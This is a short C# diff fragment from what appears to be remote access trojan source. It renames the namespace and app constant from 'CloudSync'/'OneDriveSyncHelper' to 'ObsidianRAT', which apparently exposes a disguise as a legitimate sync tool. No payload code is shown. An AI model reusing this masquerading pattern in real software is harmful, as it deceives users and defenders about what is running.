@@ -13,11 +13,11 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace CloudSync.Services.Core
+namespace ObsidianRAT.Services.Core
 {
     public class AppConfig
     {
-        public static readonly string APP = "OneDriveSyncHelper";
+        public static readonly string APP = "ObsidianRAT";
         public static readonly string exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
 
         public static string GetHostname()
